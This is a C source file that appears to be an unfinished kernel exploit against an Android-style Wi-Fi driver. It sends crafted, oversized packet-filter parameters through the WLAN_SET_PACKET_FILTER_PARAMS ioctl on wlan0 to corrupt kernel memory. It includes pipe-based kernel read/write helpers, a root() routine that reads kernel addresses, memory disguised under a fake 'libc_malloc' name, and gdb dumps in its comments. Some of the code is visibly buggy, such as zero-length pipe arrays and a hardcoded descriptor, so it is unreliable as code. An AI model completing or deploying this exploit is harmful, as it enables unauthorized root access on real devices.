#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <asm/ioctls.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <linux/kernel.h>
#include <net/if.h>
#include "structs.h" 


int write_kernel(void* kernel_addr, void* process_addr, int size){
	int filedes[0];
	int size_res;
	
	pipe(filedes);
	
	write(filedes[1], process_addr, size);
	if( size != ( size_res = read(filedes[0], kernel_addr, size) ) ){
		puts("[--] failed to write kernel");
	}
	
	close(filedes[0]);
	close(filedes[1]);
	return size_res;
}

int kernel_read(void* kernel_addr, void* process_addr, int size){
	int filedes[0];
	int size_res;
	
	pipe(filedes);
	
	if( size != ( size_res = write(filedes[1], kernel_addr, size) ) ){
		puts("[--] failed to read kernel"); 
	}else{
		read(filedes[0], process_addr, size);
	}
	
	close(filedes[0]);
	close(filedes[1]);
	return size_res;
}

void* mmap_and_prctl(size_t size){
	void* addr = mmap(NULL, size, 0x3/*PROT_READ|PROT_WRITE*/, 0x22/*MAP_PRIVATE|MAP_ANONYMOUS*/, -1, 0);
	if(-1 == (long int)addr || NULL == addr){
		return NULL;
	}
	/*
	<sys/prctl.h>
	#define PR_SET_VMA		0x53564d41
	#define PR_SET_VMA_ANON_NAME		0
	http://comments.gmane.org/gmane.linux.kernel.mm/103164
	*/
	prctl(0x53564d41, 0, addr, size, "libc_malloc");
	return addr;
}

void* sub_443C10(size_t size, int x1, char* res){//0x100000, 0x100000
	void* addr;
	void* addr2;
	long int size2;
	long int n;
	long n1;
	long int n2;
	long int n3;
	long int n4;
	
	printf("hello world\n");
	
	addr = mmap_and_prctl(size);
	if(NULL == addr){
		//loc_443CDC
		return NULL;
	}
	n = x1-1;
	if( 0 == addr & n ){
		//loc_443C4C
		*res = 1;
		return addr;
	}
	munmap(addr, size);
	n2 = -x1;
	size2 = (unsigned long int)size + (x1 - 0x1000);//0x1ff000
	if( (unsigned long int)size >  size2){
		//loc_443CDC
		return NULL;
	}
	do {
		addr2 = mmap_and_prctl(size2);
		if(NULL == addr2){
			//loc_443CDC
			return NULL;
		}
		n1 =  ( (unsigned long)addr2 + n ) & ( n2 );//x19
		n3 =  n1 - (unsigned long)addr2;//x1
		n4 = size2 - n3 - size ; //x20
		if( 0 != n3 ){
			munmap(addr2, x1);
		}
		if( 0 != n4 ){
			munmap((void*)(n1 + size), n4);
		} 
	}while(0 == n1);
	
	//loc_443C4C
	*res = 1;
	return (void*)n1;
}

int prepare(){
	int fd;
	int ret;
	void* map_addr0;
	void* map_addr1;
	void* map_addr2; 
	char data[1024] = {0};
	struct ifreq req;
	//struct tPacketFilterCfg cfg;
	unsigned long int tmp;
	
	//sub_443C10(1, 2, NULL);
	/*
	./iwpriv
	//WLAN_SET_PACKET_FILTER_PARAMS
	setPktFilter     (8BF7) : set 103 byte  & get   0
	*/
	
	printf("req=%ld\n", sizeof(req));
	printf("req.ifr_name=%ld\n", sizeof(req.ifr_name));
	printf("req.ifr_ifru=%ld\n", sizeof(req.ifr_ifru));
	printf("req.ifr_ifru.ifru_addr=%ld\n", sizeof(req.ifr_ifru.ifru_addr));
	printf("req.ifr_ifru.ifru_map=%ld\n", sizeof(req.ifr_ifru.ifru_map));
	printf("req.ifr_ifru.ifru_data=%ld\n", sizeof(req.ifr_ifru.ifru_data));
	printf("req.ifr_ifru.ifru_settings=%ld\n", sizeof(req.ifr_ifru.ifru_settings));
	
	//printf("cfg=%ld\n", sizeof(cfg));
	
	
	
	
	/*
	struct PacketFilterParamsCfg
{
    v_U8_t              protocolLayer;
    v_U8_t              cmpFlag;   
    v_U8_t              dataOffset;
    v_U8_t              dataLength;
    v_U8_t              compareData[8];
    v_U8_t              dataMask[8];
};

	(gdb) x/15xg 0x0000007fffffe230
0x7fffffe230:   0x0000000000040001      0x0413370000414141
0x7fffffe240:   0x0c13370008133700      0x1413370010003700
0x7fffffe250:   0x1c13370018133700      0x2400370020133700
0x7fffffe260:   0x2c13370028133700      0x3413370030133700
0x7fffffe270:   0x3c13370038d43700      0x4413370040133700
0x7fffffe280:   0x4c13370048133700      0x5413370050133700
0x7fffffe290:   0x5c13370058133700      0x6413370060133700
0x7fffffe2a0:   0x6c13370068133700

0x040001
0x00 00 00 00 00~~~~~~	0x0413370000414141	0x~~13370008133700
0x0c~~~~~~~~~~~~~~	0x1413370010 00 37 00	0x 1c13370018 133700	0x~~~~~~~~~~133700
0x24 00 37 00 20~~~~~~	0x2c 13370028133700	0x~~13370030133700
0x34~~~~~~~~~~~~~~	0x3c13370038 d4 37 00	0x4413370040 133700	0x~~~~~~~~~~133700
0x4c 13 37 00 48~~~~~~	0x54 13370050133700	0x~~13370058133700
	*/
/*
	memset(&req, 0, sizeof(req));
	strcpy(req.ifr_name, "wlan0");
	req.ifr_ifru.ifru_data = &cfg;
	
	*((unsigned long int*)(&req) + 3) = 0x0000000000001000UL;
	*((unsigned long int*)(&req) + 4) = 0x0000000000000480;
	
	#define assign_chrs(dst, variable, value) variable=value; memcpy(dst, &variable, sizeof(variable));
	
	memset(&cfg, 0, sizeof(cfg));
	cfg.filterAction=1;
	cfg.filterId=0;
	cfg.numParams=4;
	
	cfg.paramsData[0].protocolLayer = 0;
	cfg.paramsData[0].cmpFlag = 0;
	cfg.paramsData[0].dataOffset = 0;
	cfg.paramsData[0].dataLength = 0;
	//cfg.paramsData[0].compareData = 0x1337000041414100UL;
	//cfg.paramsData[0].dataMask = 0x1337000813370004UL;
	assign_chrs(cfg.paramsData[0].compareData, tmp, 0x1337000041414100UL);
	assign_chrs(cfg.paramsData[0].dataMask, tmp, 0x1337000813370004UL);
	
	
	cfg.paramsData[1].protocolLayer = 0x0C;
	cfg.paramsData[1].cmpFlag = 0;
	cfg.paramsData[1].dataOffset = 0x37;
	cfg.paramsData[1].dataLength = 0;
	//cfg.paramsData[1].compareData = 0x1337001413370010UL;
	//cfg.paramsData[1].dataMask = 0x1337001c13370018UL;
	assign_chrs(cfg.paramsData[1].compareData, tmp, 0x1337001413370010UL);
	assign_chrs(cfg.paramsData[1].dataMask, tmp, 0x1337001c13370018UL);
	
	cfg.paramsData[2].protocolLayer = 0x20;
	cfg.paramsData[2].cmpFlag = 0;
	cfg.paramsData[2].dataOffset = 0x37;
	cfg.paramsData[2].dataLength = 0;
	//cfg.paramsData[2].compareData = 0x1337002813370024UL;
	//cfg.paramsData[2].dataMask = 0x133700301337002cUL;
	assign_chrs(cfg.paramsData[2].compareData, tmp, 0x1337002813370024UL);
	assign_chrs(cfg.paramsData[2].dataMask, tmp, 0x133700301337002cUL);
	
	cfg.paramsData[3].protocolLayer = 0x34;
	cfg.paramsData[3].cmpFlag = 0;
	cfg.paramsData[3].dataOffset = 0x37;
	cfg.paramsData[3].dataLength = 0xd4;
	//cfg.paramsData[3].compareData = 0x1337003c13370038UL;
	//cfg.paramsData[3].dataMask = 0x1337004413370040UL;
	assign_chrs(cfg.paramsData[3].compareData, tmp, 0x1337003c13370038UL);
	assign_chrs(cfg.paramsData[3].dataMask, tmp, 0x1337004413370040UL);
	
	cfg.paramsData[4].protocolLayer = 0x48;
	cfg.paramsData[4].cmpFlag = 0;
	cfg.paramsData[4].dataOffset = 0x37;
	cfg.paramsData[4].dataLength = 0x13;
	//cfg.paramsData[4].compareData = 0x133700501337004cUL;
	//cfg.paramsData[4].dataMask = 0x1337005813370054UL;
	assign_chrs(cfg.paramsData[4].compareData, tmp, 0x133700501337004cUL);
	assign_chrs(cfg.paramsData[4].dataMask, tmp, 0x1337005813370054UL);
	
	
	
	fd = socket(PF_INET, SOCK_STREAM, IPPROTO_IP);
	if( -1 == ( ret = ioctl(3, 0x8bf7, &req, 0x30) ) ){
		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
	}
	printf("[++] ioctl wlan0 ret=%d\n", ret);
	if( -1 == ( ret = ioctl(3, 0x8bf7, &req, 0x889) ) ){
		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
	}
	printf("[++] ioctl wlan0 ret=%d\n", ret);
	
	prctl(PR_SET_NAME, "n14PwfvAq8");
*/
	return 0;
}


void prepare2(){
	int ret;
	int fd ;
	struct ifreq req;
	char data[32]={0};//sp+0x3470
	char data2[0x1000] = {0};//sp+0x2470
	unsigned int n0;
	unsigned int n1;
	char* ptr0;
	int n2;
	
	
	printf("req=%ld\n", sizeof(req));//40
	printf("req.ifr_name=%ld\n", sizeof(req.ifr_name));//16
	printf("req.ifr_ifru=%ld\n", sizeof(req.ifr_ifru));//24
	printf("req.ifr_ifru.ifru_addr=%ld\n", sizeof(req.ifr_ifru.ifru_addr));//16
	printf("req.ifr_ifru.ifru_map=%ld\n", sizeof(req.ifr_ifru.ifru_map));//24
	printf("req.ifr_ifru.ifru_data=%ld\n", sizeof(req.ifr_ifru.ifru_data));//8
	printf("req.ifr_ifru.ifru_settings=%ld\n", sizeof(req.ifr_ifru.ifru_settings));//16
	
	fd = socket(2, 1, 0);
	
	*((unsigned long int*)data) = 0;
	*((unsigned long int*)data + 1) = 0;
	*((unsigned long int*)data + 2) = 0;
	*((unsigned long int*)data + 3) = 0;
	
	memset(data2, 0, 0x1000);
	//identify_current_device();
	memset(data2+8, 'A', 0x1000-8);
	
	n0 = 0;
	n1 = 0x13370000;
	ptr0 = (char*)(data2 + 0xB);
	do{//loc_401BFC
		*( unsigned int *)( ptr0 + n0 ) = n1 + n0;
		n0 = n0 + 4;
	}while( n0 < 0xFF8 );
	
	*(unsigned int*)data = 0x6E616C77;
	*(data+4) = 0x30;		//wlan0
	*(void**)(data+0x10) = data2;
	*(unsigned short*)(data+0x18) = 0x1000;
	*(unsigned short*)(data+0x1A) = 0;
	
	*(unsigned short int*)data2  = 0x1;
	*(data2+2) = 0x4;
	
	 ptr0 = data2+6;
	 n2 = 0;
	 do{//loc_401C60
		*ptr0 = 0;
		ptr0 = ptr0 + 0x14; 
		n2 = n2 + 1;
	 }while( n2 < *(data2+2) - 1);
	 *ptr0 = 0xD4;
	 
	if( -1 == ( ret = ioctl(3, 0x8bf7, &req, 0x30) ) ){
		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
	}
	printf("[++] ioctl wlan0 ret=%d\n", ret);
	if( -1 == ( ret = ioctl(3, 0x8bf7, &req, 0x889) ) ){
		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
	}
	printf("[++] ioctl wlan0 ret=%d\n", ret);
	
	
}

void print_chars(char* chs, int size){
	int i;
	printf("%p : ", chs);
	for(i=0; i<size; i++){
		if( *(chs+i) < 16 ){
			printf("0%x ", *(chs+i));
		}else{
			printf("%x ", *(chs+i));
		}
	}
	printf("\n");
}

void prepare3(){
	int ret;
	int fd ;
	char data[0x1000];
	struct tPacketFilterCfg* pCfg;
	struct ifreq ifr;
	char* ptr0;
	unsigned int n0;
	unsigned int n1;
	
	//cfg init
	pCfg = (struct tPacketFilterCfg*)&data;
	memset(pCfg, 0, 8);
	memset((char*)pCfg+8, 'A', sizeof(data)-8);
	
	ptr0 = (char*)pCfg + 0xB;
	n0 = 0;
	n1 = 0x13370000;
	do{//loc_401BFC
		*( unsigned int *)( ptr0 + n0 ) = n1 + n0;
		n0 = n0 + 4;
	}while( n0 < 0xFF8 );
	
	pCfg->filterAction = 0x1;
	pCfg->filterId = 0x0;
	pCfg->numParams = 0x4;
	
	n0 = 0;
	do{
		pCfg->paramsData[n0++].dataLength = 0;
	}while( n0 < pCfg->numParams-1 );
	pCfg->paramsData[n0].dataLength = 0xD4;
	
	//ifr init
	memset(&ifr, 0, sizeof(ifr));
	
	strcpy(ifr.ifr_ifrn.ifrn_name, "wlan0");
	ifr.ifr_ifru.ifru_data = pCfg;
	*(unsigned int*)( (char*)&ifr.ifr_ifru.ifru_data + sizeof(void*) ) = 0x1000;
	
	//exploy
	fd = socket(2, 1, 0);
	
	if( -1 == ( ret = ioctl(3, WLAN_SET_PACKET_FILTER_PARAMS, &ifr, 0x30) ) ){
		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
	}
	printf("[++] ioctl wlan0 ret=%d\n", ret);
	/*
	if( -1 == ( ret = ioctl(3, WLAN_SET_PACKET_FILTER_PARAMS, &ifr, 0x889) ) ){
		printf("[--] ioctl wlan0 fail errno=(%d, %s)\n", errno, strerror(errno));
	}
	printf("[++] ioctl wlan0 ret=%d\n", ret);
	*/
	//验证
	printf("+++++++++++++++++++++++\n");
	print_chars( (char*)&ifr, 16 );
	print_chars( (char*)&ifr.ifr_ifru.ifru_data, sizeof(ifr)-16);
	
	print_chars( (char*)pCfg, 3);
	print_chars( (char*)pCfg+3, 20);
	print_chars( (char*)pCfg+23, 20);
	print_chars( (char*)pCfg+43, 20);
	print_chars( (char*)pCfg+63, 20);
	print_chars( (char*)pCfg+83, 20);
	print_chars( (char*)pCfg+103, 20);
}

void root(){
	void* addr = (void*)0xffffffc000800000UL;
	char* kernel_data = NULL;
	int size = -1;
	
	//prepare();
	//prepare3();
	prepare3();
	
	kernel_data = (char*)malloc(0x4000);
	printf("[+] kernel_data=%p\n", kernel_data);
	
	size = kernel_read(addr, kernel_data, 0x4000);
	printf("[+] size=%d\n", size);
}

int main(int argc, char* argv[]){
	root();
	return 0;
}